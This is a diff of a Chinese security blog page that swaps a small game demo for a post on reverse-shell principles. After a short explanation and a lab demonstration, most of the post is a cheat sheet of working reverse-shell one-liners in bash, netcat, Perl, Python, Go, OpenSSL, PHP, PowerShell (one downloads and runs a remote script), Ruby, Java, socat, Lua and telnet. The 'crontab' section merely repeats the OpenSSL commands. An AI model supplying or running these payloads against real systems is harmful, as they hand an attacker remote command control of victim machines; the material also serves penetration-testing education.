@@ -8,15 +8,13 @@
   <link rel="dns-prefetch" href="http://austfish.github.io">
   <title>Fisher&#39;s 安全日记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="*{ 		margin:0; 		padding:0; 	} 	#textBox{ 		position: absolute; 		left: 0; 		top: 0; 		z-index: -999; 	} 	#bg{ 		background: url(sgws.jpg) -50px;  		width:500px; 		height: 314px; 		text-align:">
+  <meta name="description" content="努力努力再努力，微信公众号：austfish">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Fisher&#39;s 安全日记">
-<meta property="og:url" content="http://austfish.github.io/assets/demo/mediator/demo.html">
+<meta property="og:url" content="http://austfish.github.io/page/3/index.html">
 <meta property="og:site_name" content="Fisher&#39;s 安全日记">
-<meta property="og:description" content="*{ 		margin:0; 		padding:0; 	} 	#textBox{ 		position: absolute; 		left: 0; 		top: 0; 		z-index: -999; 	} 	#bg{ 		background: url(sgws.jpg) -50px;  		width:500px; 		height: 314px; 		text-align:">
+<meta property="og:description" content="努力努力再努力，微信公众号：austfish">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-08-20T14:48:16.049Z">
-<meta property="article:modified_time" content="2022-08-20T14:48:16.049Z">
 <meta property="article:author" content="Fisher">
 <meta property="article:tag" content="学习">
 <meta name="twitter:card" content="summary">
@@ -159,118 +157,136 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            
+  
+    <article id="post-浅析反弹shell原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/08/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/">浅析反弹shell原理</a>
+    </h1>
+  
+
+        
+        <a href="/2021/04/08/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/" class="archive-article-date">
+  	<time datetime="2021-04-08T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-08</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <!DOCTYPE HTML>
-<html>
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<script type="text/javascript" src="jquery.js"></script>
-<style type="text/css">
-	*{
-		margin:0;
-		padding:0;
-	}
-	#textBox{
-		position: absolute;
-		left: 0;
-		top: 0;
-		z-index: -999;
-	}
-	#bg{
-		background: url(sgws.jpg) -50px;
+        <h2 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h2><p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。然而 Shell 的功能是能够接收用户输入的命令，并对命令进行处理，处理完毕后再将结果反馈给用户，比如输出到显示器、写入到文件等。</p>
+<h2 id="0×02-shell-和反弹-shell"><a href="#0×02-shell-和反弹-shell" class="headerlink" title="0×02 shell 和反弹 shell"></a>0×02 shell 和反弹 shell</h2><p><strong>正常 shell</strong></p>
+<ul>
+<li>需要先在客户端（攻击端）开机情况下开启程序,然后客户端（攻击端）运行程序,才能连接服务端（被攻击端）</li>
+</ul>
+<p><strong>反弹 shell</strong></p>
+<ul>
+<li>先启用服务端（攻击端）,再启用客户端(被攻击端)</li>
+<li>就是控制端监听在某 TCP&#x2F;UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</li>
+</ul>
+<p><img src="http://qiniu.austfish.cn/yuque/FrQOczpKjSPL2UxR8ZKxW7X10GRo.png"></p>
+<h2 id="0×03-为什么要反弹-shell"><a href="#0×03-为什么要反弹-shell" class="headerlink" title="0×03 为什么要反弹 shell"></a>0×03 为什么要反弹 shell</h2><p>当我们在渗透 Linux 主机时，反弹一个交互的 shell 是非常有必要的。反弹 shell 通常用于被控端因防火墙受限、权限不足、端口被占用等情形导致连接失败。</p>
+<blockquote>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web 服务，ssh，telnet 等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
+</blockquote>
+<ol>
+<li>对方主机在局域网内，从外网无法直接访问。</li>
+<li>对方主机上存在 WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。</li>
+<li>对方的 ip 会动态改变，你不能持续控制。</li>
+<li>对方由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</li>
+</ol>
+<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。在渗透测试过程中，得到 webshell 后一般我们会反弹 shell。</p>
+<h2 id="0×04-反弹-shell-的流程"><a href="#0×04-反弹-shell-的流程" class="headerlink" title="0×04 反弹 shell 的流程"></a>0×04 反弹 shell 的流程</h2><p><strong>操作步骤</strong></p>
+<ol>
+<li>在本机开启并监听端口</li>
+<li>在需要被控制的机器上执行反弹 shell 命令</li>
+<li>在本机监听反弹 shell 的端口</li>
+</ol>
+<p><strong>原理解释</strong></p>
+<ol>
+<li>A 主机开启 9090 端口的 tcp 服务</li>
+<li>B 主机连接到 A 主机的 9090 的 tcp 服务</li>
+<li>A 主机通过 tcp 服务把命令发到 B 主机</li>
+<li>B 主机读取命令并且在 bash 中执行</li>
+<li>B 主机把执行结果发给 A 主机</li>
+<li>这样就可以在 A 主机中<strong>操控</strong>B 主机了</li>
+</ol>
+<h2 id="0×05-反弹-shell-实战"><a href="#0×05-反弹-shell-实战" class="headerlink" title="0×05 反弹 shell 实战"></a>0×05 反弹 shell 实战</h2><h4 id="centos-10-0-36-51"><a href="#centos-10-0-36-51" class="headerlink" title="centos:10.0.36.51"></a>centos:10.0.36.51</h4><p><code>bash -i &gt;&amp; /dev/tcp/10.0.36.56/2333 0&gt;&amp;1</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 2333 ...</span><br><span class="line">10.0.36.51: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.0.36.56] from (UNKNOWN) [10.0.36.51] 58886</span><br></pre></td></tr></table></figure>
 
-		width:500px;
-		height: 314px;
-		text-align: center;
-		position: relative;
-		-webkit-animation:roll 3s infinite ease ;
-		   -moz-animation:roll 3s infinite ease ;
-		    -ms-animation:roll 3s infinite ease ;
-		     -o-animation:roll 3s infinite ease ;
-				animation:roll 3s infinite ease ;
-	}
-	#barHome{
-		width: 300px;
-		height: 10px;
-		background: #f00;
-		overflow: hidden;
-		position: absolute;
-		bottom: 45px;
-		left: 50%;
-		margin-left: -150px;
-	}
-	#barGuest{
-		width: 150px;
-		height: 10px;
-		background: #00f;
-	}
-	#results{
-		width: 300px;
-		position: absolute;
-		bottom: 65px;
-		left: 50%;
-		margin-left: -150px;
-		color: #fff;
-	}
-	#results span{
-		margin: 50px;
-	}
-	@-webkit-keyframes roll {0%{background-position: -90px;}50%{background-position: -10px;}100%{background-position: -90px;}}
-	@-moz-keyframes roll {0%{background-position: -90px;}50%{background-position: -10px;}100%{background-position: -90px;}}
-	@-ms-keyframes roll {0%{background-position: -90px;}50%{background-position: -10px;}100%{background-position: -90px;}}
-	@-o-keyframes roll {0%{background-position: -90px;}50%{background-position: -10px;}100%{background-position: -90px;}}
-	@keyframes roll {0%{background-position: -90px;}50%{background-position: -10px;}100%{background-position: -90px;}}
-</style>
-<title>mediator</title>
-</head>
-<body>
-	<div id="bg">
-		<input id="textBox" type="text" />
-		<div id="results">请按F键与J键</div>
-		<div id="barHome">
-			<div id="barGuest"></div>
-		</div>
-	</div>
-<script type="text/javascript" src="mediator.js"></script>
-</body>
-</html>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:10:c4:1e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.36.51/16 brd 10.0.255.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::ae94:f32d:f1dc:c87f/64 scope link dadfailed tentative noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::a0f6:70e4:c065:cc2a/64 scope link dadfailed tentative noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::a413:94d1:3e88:e122/64 scope link noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<h4 id="kail-10-0-36-56"><a href="#kail-10-0-36-56" class="headerlink" title="kail:10.0.36.56"></a>kail:10.0.36.56</h4><p><code>nc -lvp 2333</code></p>
+<h2 id="0×05-反弹-shell-大全"><a href="#0×05-反弹-shell-大全" class="headerlink" title="0×05 反弹 shell 大全"></a>0×05 反弹 shell 大全</h2><h4 id="Bash-反弹-shell"><a href="#Bash-反弹-shell" class="headerlink" title="Bash 反弹 shell"></a>Bash 反弹 shell</h4><p><code>/bin/bash -c bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1</code></p>
+<h4 id="Bash-反弹-shell-TCP"><a href="#Bash-反弹-shell-TCP" class="headerlink" title="Bash 反弹 shell TCP"></a>Bash 反弹 shell TCP</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;your IP&gt;/&lt;same unfiltered port&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<h4 id="Bash-反弹-shell-UDP"><a href="#Bash-反弹-shell-UDP" class="headerlink" title="Bash 反弹 shell UDP"></a>Bash 反弹 shell UDP</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Victim:</span><br><span class="line">sh -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Listener:</span><br><span class="line">nc -u -lvp 4242</span><br></pre></td></tr></table></figure>
+
+<h4 id="NC-反弹-shell"><a href="#NC-反弹-shell" class="headerlink" title="NC 反弹 shell"></a>NC 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 12388 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<h4 id="perl-反弹-shell"><a href="#perl-反弹-shell" class="headerlink" title="perl 反弹 shell"></a>perl 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;[IPADDR]:[PORT]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e &#x27;$c=new IO::Socket::INET(PeerAddr,&quot;[IPADDR]:[PORT]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Python-反弹-shell"><a href="#Python-反弹-shell" class="headerlink" title="Python 反弹 shell"></a>Python 反弹 shell</h4><p><strong>Linux</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 方法一</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span></span><br><span class="line"></span><br><span class="line">// 方法二</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> RHOST=<span class="string">&quot;127.0.0.1&quot;</span>;<span class="built_in">export</span> RPORT=12345;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows Python 反弹 shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#x27;10.11.0.37&#x27;, 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#x27;p2s_thread&#x27;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#x27;s2p_thread&#x27;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#x27;p&#x27;] in [(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;p2s&#x27;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;].send(__l[&#x27;p&#x27;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;p2s&#x27;)]][0] for __g[&#x27;s2p&#x27;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;].stdin.write(__l[&#x27;data&#x27;]), __after())[1] if (len(__l[&#x27;data&#x27;]) &gt; 0) else __after())(lambda: __this()) for __l[&#x27;data&#x27;] in [(__l[&#x27;s&#x27;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;s2p&#x27;)]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;threading&#x27;] in [(__import__(&#x27;threading&#x27;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Golang-反弹-shell"><a href="#Golang-反弹-shell" class="headerlink" title="Golang 反弹 shell"></a>Golang 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;192.168.0.134:8080&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</span><br></pre></td></tr></table></figure>
+
+<h4 id="Ncat-反弹-shell"><a href="#Ncat-反弹-shell" class="headerlink" title="Ncat 反弹 shell"></a>Ncat 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat 127.0.0.1 4444 -e /bin/bash</span><br><span class="line">ncat --udp 127.0.0.1 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="OpenSSL-反弹-shell"><a href="#OpenSSL-反弹-shell" class="headerlink" title="OpenSSL 反弹 shell"></a>OpenSSL 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span></span><br><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4242</span></span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">ncat --ssl -vv -l -p 4242</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">user@company$ </span><span class="language-bash"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:4242 &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span></span><br><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 4242</span></span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_">hacker@kali$ </span><span class="language-bash">ncat --ssl -vv -l -p 4242</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">user@company$ </span><span class="language-bash"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:4242 &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="PHP-反弹-shell"><a href="#PHP-反弹-shell" class="headerlink" title="PHP 反弹 shell"></a>PHP 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Powershell-反弹-shell"><a href="#Powershell-反弹-shell" class="headerlink" title="Powershell 反弹 shell"></a>Powershell 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;[IPADDR]&quot;,[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.1.3.40&#x27;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Ruby-反弹-shell"><a href="#Ruby-反弹-shell" class="headerlink" title="Ruby 反弹 shell"></a>Ruby 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>不依赖于&#x2F;bin&#x2F;sh 的反弹 shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果目标系统运行 Windows 反弹 shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Java-反弹-shell"><a href="#Java-反弹-shell" class="headerlink" title="Java 反弹 shell"></a>Java 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h4 id="socat-反弹-shell"><a href="#socat-反弹-shell" class="headerlink" title="socat 反弹 shell"></a>socat 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555</span><br></pre></td></tr></table></figure>
+
+<h4 id="Lua-反弹-shell"><a href="#Lua-反弹-shell" class="headerlink" title="Lua 反弹 shell"></a>Lua 反弹 shell</h4><p><strong>Linux</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua5.1 -e &#x27;local host, port = &quot;127.0.0.1&quot;, 4444 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#x27;r&#x27;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Telnet-反弹-shell"><a href="#Telnet-反弹-shell" class="headerlink" title="Telnet 反弹 shell"></a>Telnet 反弹 shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取反弹 shell 后，可使用 python 获得交互式 shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; python -c &#x27;&#x27;&#x27; import pty while(1):     try:         pty.spawn(&quot;/bin/bash&quot;)     except :         contiune&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
